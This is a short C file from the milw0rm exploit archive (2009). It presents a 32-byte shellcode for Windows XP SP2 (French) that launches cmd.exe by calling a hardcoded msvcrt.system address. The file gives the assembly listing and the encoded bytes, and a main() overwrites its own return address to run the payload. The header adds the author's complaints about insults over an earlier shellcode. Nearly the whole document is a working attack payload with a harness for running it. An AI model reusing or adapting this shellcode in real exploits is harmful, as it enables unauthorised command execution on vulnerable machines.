/*
windows/XP sp2 (FR) Sellcode cmd.exe 32 bytes
Author : Mountassif Moad
Big Thnx : Houssamix & SimO-s0fT
Changed by : Stack
Description : It is 32 Byte Shellcode which Execute Cmd.exe Tested Under Windows Xp SP2 FR
My first original shellcode Here http://www.milw0rm.com/shellcode/7971
because i receive every day full message who insult me (you'r lamer - fucker ->
you dont understand anything abouts sec )  infinity of insult
and the last time i receive an message have  => i make full error in my first shelcode & in the end he
insult my mother & me (shit)
so i tell all people when want insult anyone remembers we are just human not angel
euuuh : i'm decide to write another small shellcode this time just for fun (32 bytes xd )
Assembly Code : this time is not a secret (:@)
00402000   8BEC             MOV EBP,ESP
00402002   33FF             XOR EDI,EDI
00402004   57               PUSH EDI
00402005   C645 FC 63       MOV BYTE PTR SS:[EBP-4],63
00402009   C645 FD 6D       MOV BYTE PTR SS:[EBP-3],6D
0040200D   C645 FE 64       MOV BYTE PTR SS:[EBP-2],64
00402011   C645 F8 01       MOV BYTE PTR SS:[EBP-8],1
00402015   8D45 FC          LEA EAX,DWORD PTR SS:[EBP-4]
00402018   50               PUSH EAX
00402019   B8 C793BF77      MOV EAX,msvcrt.system (i notice this for work in other machine)
0040201E   FFD0             CALL EAX
*/
#include "stdio.h"
unsigned char shellcode[] =
"\x8B\xEC\x33\xFF\x57"
"\xC6\x45\xFC\x63\xC6\x45"
"\xFD\x6D\xC6\x45\xFE\x64"
"\xC6\x45\xF8\x01\x8D"
"\x45\xFC\x50\xB8\xC7\x93"
"\xBF\x77\xFF\xD0";
int main ()
{
int *ret;
ret=(int *)&ret+2;
printf("Shellcode Length is : %d\n",strlen(shellcode));
(*ret)=(int)shellcode;
return 0;
}

// milw0rm.com [2009-02-20]